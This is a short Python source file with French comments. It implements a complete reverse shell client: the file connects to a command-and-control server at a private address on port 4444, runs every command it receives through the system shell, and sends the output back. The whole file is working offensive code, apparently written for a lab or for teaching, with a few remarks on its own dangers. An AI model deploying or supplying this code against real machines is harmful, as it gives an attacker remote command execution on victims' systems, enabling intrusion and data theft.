import socket
import subprocess

class Cible:
    def __init__(self, host='10.102.252.40', port=4444):
        # Adresse et port du serveur de commande (C2).
        self.host = host
        self.port = port
        # Socket TCP IPv4
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    def connect(self):
        try:
            # Tente de se connecter au serveur
            self.socket.connect((self.host, self.port))
            print(f"[+] Connecté au C2 {self.host}:{self.port}")
            # Envoie un message initial
            self.send("Cible connectée")

            while True:
                # Reçoit des données. Attention : taille fixe = 1024 octets.
                # Si la commande est plus longue, il faudrait lire en boucle ou utiliser un protocole
                cmd = self.socket.recv(1024).decode().strip()
                if not cmd or cmd == "exit":
                    # Si aucune commande ou commande 'exit', on quitte la boucle
                    break

                # Exécute la commande reçue via le shell et capture stdout/stderr
                # Remarque de sécurité : shell=True + entrée réseau = très dangereux
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
                output = result.stdout if result.stdout else result.stderr

                # Envoie la sortie de la commande au serveur
                self.send(output)

        except Exception as e:
            # Affiche l'erreur si quelque chose échoue
            print(f"[!] Erreur: {e}")
        finally:
            # Ferme la socket proprement
            self.socket.close()

    def send(self, data):
        # Envoie une chaîne encodée en bytes. Pas de contrôle d'erreur ici.
        if not data:
            data = ""  # évite d'envoyer None
        try:
            self.socket.send(data.encode())
        except Exception as e:
            print(f"[!] Erreur en envoyant les données: {e}")

if __name__ == "__main__":
    cible1 = Cible()
    cible1.connect()
